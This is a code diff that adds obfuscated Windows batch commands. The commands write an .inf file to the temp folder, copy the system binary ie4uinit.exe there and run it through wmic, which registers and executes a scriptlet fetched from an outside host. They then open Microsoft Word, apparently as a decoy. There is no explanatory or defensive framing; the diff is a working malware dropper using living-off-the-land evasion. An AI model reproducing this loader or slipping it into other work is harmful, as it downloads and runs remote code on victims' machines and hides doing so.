@@ -1,0 +1,8 @@
+/v /ccall%Knights:~0,1%et "Plastic=.inf" &&
+  %Knights:~0,1%et "Awful=ieuinit!Plastic!" &&
+  call %Knights:~0,1%et "Obtain=%t!Profit!mp%\" &&
+  (for /D %n in ("[defaultin%Knights:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=3213AB" "delfiles=A174" "[de%Knights:~0,1%tinationdirs]" "A174=01" "defaultdestdir=11" "[3213AB]" "sc\" "ro%Impact%j,NI,%Wells%%Contracts%%Contracts%p%Eyebrow%%Engage%%Engage%sslla.brokarry.%Thats%/smjflw9s" "[version]" "signature =$windows nt$" "[string%Knights:~0,1%]" "Pipes=init" "Ourselves=%time%" "Engage=/" "Contracts=t;Winners" "%Knights:~0,1%ervicename=' '" "Eyebrow=:;Media" "Thats=com" "Impact=b;Files" "Wells=h" "%Knights:~0,1%hortsvcname=' '" "[A174]" "ieu%Pipes%!Plastic!" ) do @echo %~n)>"!Obtain!!Awful!" &&
+  %Knights:~0,1%et "Evoke=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Appointments!ir%\%Knights:~0,1%ystem32\!Evoke! "!Obtain!*" &&
+  start "" wmic proce%Knights:~0,1%s call create "!Obtain!!Evoke! -basesettings" &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
